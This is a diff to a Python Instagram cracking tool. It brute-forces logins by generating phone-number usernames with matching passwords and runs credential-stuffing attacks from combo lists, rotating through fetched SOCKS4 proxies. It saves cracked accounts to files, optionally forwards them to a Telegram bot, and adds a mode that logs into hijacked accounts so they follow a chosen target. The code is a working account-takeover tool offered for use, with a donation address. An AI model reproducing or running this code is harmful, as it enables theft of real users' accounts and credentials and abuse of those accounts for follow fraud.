@@ -2,15 +2,16 @@ import requests
 import random
 from uuid import uuid4
 from time import sleep
-from stem import Signal
-from stem.control import Controller
-from fake_useragent import UserAgent
-ua = UserAgent()
+import secrets,os
+
 green = "\033[1;32m"
 red = "\033[0;31m"
 orng = "\033[0;33m"
 white = "\033[0;37m"
 blue = '\033[1;34m'
+done = 0 
+Fai = 0
+alll = 0
 secure = 'challenge_required'
 errorPas = 'The password you entered is incorrect';loginm = 'logged_in_user'
 wit = 'Please wait a few minutes before you try again'
@@ -41,28 +42,42 @@ print(blue+
 #                                            ################
 
 ''')
-print(white+"--------------------------------------")
-print("Don't forget to start Tor services (sudo service tor start)")
-passlinux = input("Enter your root password\n>>")
+def proxy():
+    re = requests.get("https://abdullahcoder.pythonanywhere.com/proxy/socks4").text
+    r1 = re.splitlines()
+    prox = random.choice(r1)
+    return str(prox)
+
+
 
 def send_Tele(tokin,idd,text):
   requests.get("https://api.telegram.org/bot" + tokin + "/sendMessage" + "?chat_id=" + idd + "&text=" + text)
 
-def changeip():
-    with Controller.from_port(port=9051) as controller:
-                controller.authenticate(password=passlinux)
-                controller.signal(Signal.NEWNYM)
 
 def get_inf(user,passs,ask,tokin,iddd):
         f=open('combo.txt','a+')
         f.write(user+":"+passs+"\n")
         f.close
-        info = requests.get(f"https://v6vv.tk/API/info-insta-v2.php?u={user}").json()
-        bio = info["biography"]
-        followes = info["edge_followed_by"]["count"]
-        following = info["edge_follow"]["count"]
-        name = info["full_name"]
-        id = info["id"]
+        cookie = secrets.token_hex(8) * 2
+        h = {
+         'HOST':'www.instagram.com', 
+         'KeepAlive':'True', 
+         'user-agent':'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:48.0) Gecko/20100101 Firefox/48.0', 
+         'Cookie':cookie, 
+         'Accept':'*/*', 
+         'ContentType':'application/x-www-form-urlencoded', 
+         'X-Requested-With':'XMLHttpRequest', 
+         'X-IG-App-ID':'936619743392459', 
+         'X-Instagram-AJAX':'missing', 
+         'X-CSRFToken':'missing', 
+         'Accept-Language':'en-US,en;q=0.9'}
+        url_id = f"https://www.instagram.com/{user}/?__a=1"
+        req_id = requests.get(url_id, headers=h).json()
+        name = str(req_id['graphql']['user']['full_name'])
+        id = str(req_id['graphql']['user']['id'])
+        bio = str(req_id['graphql']['user']['biography'])
+        followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
+        following = str(req_id['graphql']['user']['edge_follow']['count'])
         re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
         ree = re.json()
         dat = ree['data']
@@ -77,10 +92,10 @@ def get_inf(user,passs,ask,tokin,iddd):
 • Date : {dat}
 • bio : {bio}
 = = = = = = = = = = = = = = = = = =
-By : @Abdullah_Coder
+By : @Abdullah_programs
  """)
         if int(followes) > 1000:
-            print("✅ Premium account")
+            print("✅ Premium account\n\n")
         f = open("Hacked.txt",'a+')
         f.write(shug+"\n")
         f.close()
@@ -123,6 +138,7 @@ def login(ask,tokin,idd,key):
             us = str(''.join((random.choice(rm) for i in range(8))))
             user = "+2010"+ us
             passs = "010" + us
+#مهما حاولت ان تطمس هويتي فسوف يظل انا مطور الاداه وانت الطفل الذي يسرق
         elif(key == "2"):
             us = str(''.join((random.choice(rm) for i in range(8))))
             user = "+2011"+ us
@@ -162,7 +178,7 @@ def login(ask,tokin,idd,key):
         elif(key == "11"):
             us = str(''.join((random.choice(rm) for i in range(7))))
             user = "+98938"+ us
-            passs = "0938" + us
+            passs = "0938" + us 
         uuid = uuid4()
         headers = {
                     'Host':'i.instagram.com',
@@ -183,9 +199,9 @@ def login(ask,tokin,idd,key):
                     'login_attempt_countn':'0',}
         # pro = random.choice(prox)
         try:
-            changeip()
+         
             try:
-                get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': 'socks5://127.0.0.1:9050'}, allow_redirects=True)
+                get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': f'socks4://{proxy()}'}, allow_redirects=True)
                 if loginm in get.text:
                     userQ = get.json()['logged_in_user']['username']
                     lo +=1
@@ -214,8 +230,9 @@ def login(ask,tokin,idd,key):
                 print(red+"ERROR",end="\r")
 
         except:
-            pass
-
+            print("Error in tor",end="\r")
+#مهما حاولت ان تطمس هويتي فسوف يظل انا مطور الاداه وانت الطفل الذي يسرق
+#Abdullah_Coder
    
 def randomm():
     ask = input("--------------------------------------\nDo you want to send available accounts on Telegram [y/n]\n--------------------------------------\n>>")
@@ -256,6 +273,7 @@ Enter the country
     print("--------------------------------------")
        
     login(ask,tokin,idd,key)
+#مهما حاولت ان تطمس هويتي فسوف يظل انا مطور الاداه وانت الطفل الذي يسرق
 
 def brute_pass():
         nm = 0
@@ -286,9 +304,9 @@ def brute_pass():
                             'login_attempt_countn':'0',}
                 # pro = random.choice(prox)
                 try:
-                    changeip()
+                   
                     try:
-                        get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': 'socks5://127.0.0.1:9050'}, allow_redirects=True)
+                        get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': f'socks4://{proxy()}'}, allow_redirects=True)
                         if loginm in get.text:
                             userQ = get.json()['logged_in_user']['username']
                             print(green + f"Done login username = {userQ} || password = {passs}")
@@ -313,6 +331,7 @@ def brute_pass():
 
         except  IndexError:
             print("There is a problem with the file lines!")
+#مهما حاولت ان تطمس هويتي فسوف يظل انا مطور الاداه وانت الطفل الذي يسرق
             
         
         except FileNotFoundError:
@@ -369,9 +388,9 @@ def combo_user_pass():
                             'login_attempt_countn':'0',}
                 # pro = random.choice(prox)
                 try:
-                    changeip()
+                    
                     try:
-                        get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': 'socks5://127.0.0.1:9050'}, allow_redirects=True)
+                        get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': f'socks4://{proxy()}'}, allow_redirects=True)
                         if loginm in get.text:
                             userQ = get.json()['logged_in_user']['username']
                             lo +=1      
@@ -413,12 +432,26 @@ def combo_user_pass():
 def get_information():
         user = input("--------------------------------------\nEnter username\n--------------------------------------\n>>")
         print(white+"--------------------------------------")
-        info = requests.get(f"https://v6vv.tk/API/info-insta-v2.php?u={user}").json()
-        bio = info["biography"]
-        followes = info["edge_followed_by"]["count"]
-        following = info["edge_follow"]["count"]
-        name = info["full_name"]
-        id = info["id"]
+        cookie = secrets.token_hex(8) * 2
+        h = {
+         'HOST':'www.instagram.com', 
+         'KeepAlive':'True', 
+         'user-agent':'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:48.0) Gecko/20100101 Firefox/48.0', 
+         'Cookie':cookie, 
+         'Accept':'*/*', 
+         'ContentType':'application/x-www-form-urlencoded', 
+         'X-Requested-With':'XMLHttpRequest', 
+         'X-IG-App-ID':'936619743392459', 
+         'X-Instagram-AJAX':'missing', 
+         'X-CSRFToken':'missing', 
+         'Accept-Language':'en-US,en;q=0.9'}
+        url_id = f"https://www.instagram.com/{user}/?__a=1"
+        req_id = requests.get(url_id, headers=h).json()
+        name = str(req_id['graphql']['user']['full_name'])
+        id = str(req_id['graphql']['user']['id'])
+        bio = str(req_id['graphql']['user']['biography'])
+        followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
+        following = str(req_id['graphql']['user']['edge_follow']['count'])
         re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
         ree = re.json()
         dat = ree['data']
@@ -434,8 +467,87 @@ def get_information():
 = = = = = = = = = = = = = = = = = =
  """)
         print(green+shug)
-                    
+def prms():
+    global done,Fai,alll
+    msg = f'''
+[#] Done {done} 
+[#] Failed {Fai}
+[#] All {alll} 
+    '''
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(msg)
 
+def follow(csrftoken,userid,ccc,user,idu):  
+    global done
+    url = f"https://www.instagram.com/web/friendships/{idu}/follow/"
+    hea = {
+    'accept': '*/*',
+    'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'en-US,en;q=0.9',
+    'content-length': '0',
+    'content-type': 'application/x-www-form-urlencoded',
+    'cookie': f'ig_did=96878DF6-EA9A-43E2-957F-1E97C615851D; mid=YD0V2gALAAGYz3k1PPiSDMko1lup; ig_nrcb=1; csrftoken={csrftoken}; ds_user_id={userid}; sessionid={ccc}; rur=FRC',
+    'origin': 'https://www.instagram.com',
+    'referer': 'https://www.instagram.com/alahlyegypt/',
+    'sec-ch-ua': '"Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36',
+    'x-csrftoken': csrftoken,
+    'x-ig-app-id': '936619743392459',
+    'x-ig-www-claim': 'hmac.AR25xcLb2inPPc3gMR8Fll3o5rrjE7I5GN9k_jZUMgUMO0hz',
+    'x-instagram-ajax': '0edc1000e5e7',
+    'x-requested-with': 'XMLHttpRequest',
+}
+    r = requests.post(url,headers=hea, proxies={'http': 'socks5://127.0.0.1:9050'})
+    done+=1
+
+def web_login(user,passs,idu):
+    global done,Fai,alll
+    url = "https://www.instagram.com/accounts/login/ajax/"
+    cookie = secrets.token_hex(8) * 2
+    hea = {
+         'HOST':'www.instagram.com', 
+         'KeepAlive':'True', 
+         'user-agent':'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:48.0) Gecko/20100101 Firefox/48.0', 
+         'Cookie':cookie, 
+         'Accept':'*/*', 
+         'ContentType':'application/x-www-form-urlencoded', 
+         'X-Requested-With':'XMLHttpRequest', 
+         'X-IG-App-ID':'936619743392459', 
+         'X-Instagram-AJAX':'missing', 
+         'X-CSRFToken':'missing', 
+         'Accept-Language':'en-US,en;q=0.9'}
+    
+    data = {
+        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:'+passs,
+        'username': user
+    }
+    re = requests.post(url,headers=hea,data=data, proxies={'http': f'socks4://{proxy()}'})
+    if '"authenticated":true' in re.text:
+        csrftoken = re.cookies["csrftoken"]
+        userid = re.cookies["ds_user_id"]
+        ccc = re.cookies["sessionid"]
+        follow(csrftoken,userid,ccc,user,idu)
+    else:
+        Fai+=1 
+    alll+=1
+    prms()  
+
+def auto_follow():
+    target = input("Enter target id (You can get it from num 4)\n>>")
+    askcombo = input("Enter combo list (default combo.txt)\n>>")
+    if askcombo == "":
+        combo = "combo.txt"
+    else:
+        combo = askcombo
+    cc =  open(combo,'r').read().splitlines()
+    for i in cc:
+        user = i.split(":")[0]
+        passs = i.split(":")[1]
+        web_login(user,passs,target)
 def main():
     while True:
         ask = input(white+'''--------------------------------------
@@ -443,6 +555,8 @@ def main():
     2) random user and pass
     3) Brute force attack IG
     4) Get Instagram account information
+    5) Auto following
+    6) Donate to me
 --------------------------------------
 >>''')
         if ask == "1":
@@ -453,6 +567,10 @@ def main():
             brute_pass()
         elif ask == "4":
             get_information()
+        elif ask == "5":
+            auto_follow()
+        elif ask == "6":
+            print("BTC :  3CkHYoi9xi9b1ykrRUpWGipLWyEZwAR1Ny")
         else:
             print("sorry I did not understand you")
             print(" ")
